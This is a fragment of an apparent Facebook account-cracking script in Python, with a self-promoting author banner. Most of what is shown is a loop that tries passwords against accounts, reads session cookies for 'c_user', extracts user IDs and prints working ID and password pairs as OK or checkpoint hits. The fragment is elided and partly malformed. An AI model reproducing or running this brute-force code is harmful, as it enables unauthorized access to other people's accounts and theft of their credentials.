...
'''
this is an open source program by Mr. Error (Rabbi-Vau)
...
def banner():
 ...
 █▀▄ █▀█ █▄█ █▄█ █
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : %Tajul Islam Rabbi             %s║"%(Z,B,M,Z))
	print("%s║%s  TOOL work    : Data+Wifi  %s║"%(Z,B,Z))
	print("%s║%sFacebook: Tajul Islam Rabbi         %s║"%(Z,B,Z))
	...
	try:
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				uidx = coki[65:80]
				print('\033[1;32m [RABBI-OK] '+uidx+'|'+pasw+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [RABBI-CP] '+uidx+' | '+pasw+'\033[0;97m')
